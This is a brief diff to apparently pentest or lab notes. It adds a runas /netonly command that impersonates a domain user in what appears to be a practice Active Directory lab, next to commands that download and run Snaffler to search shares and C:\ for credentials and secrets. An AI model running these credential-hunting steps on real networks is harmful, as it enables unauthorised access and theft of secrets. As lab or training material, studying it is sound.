@@ -6,6 +6,9 @@ https://github.com/jsdlm/scripts
 
 ```bash
 wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe
+
+runas /netonly /user:north.sevenkingdoms.local\samwell.tarly cmd
+
 .\Snaffler.exe -o snafflerout.txt -s -y
 .\Snaffler.exe -o snafflerout.txt -s -y -i C:\
 .\snafflerparser.ps1 -in snafflerout.txt
